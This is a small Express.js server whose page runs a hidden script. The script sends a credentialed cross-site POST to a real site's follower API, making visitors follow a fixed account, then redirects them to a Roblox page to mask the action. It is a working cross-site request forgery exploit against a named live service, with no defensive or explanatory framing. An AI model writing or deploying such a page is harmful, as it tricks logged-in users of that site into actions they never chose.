const express = require("express");

const app = express();

app.get("/", (req, res) => {
  res.send(`
    <h1>hi</h1>
    <script>
fetch("https://jailbreakchangelogs.xyz/api/users/followers/add", {
  "headers": {
    "content-type": "application/json",
  },
  "body": "{\"following\":\"1314131821616697386\"}",
  "method": "POST",
  "mode": "no-cors",
  "credentials": "include"
}).then(() => {
window.location.href = "https://www.roblox.com/users/profile";
});
</script>

  `);
});

app.listen(5500, () => {
  console.log("listening on http://localhost:5500");
});
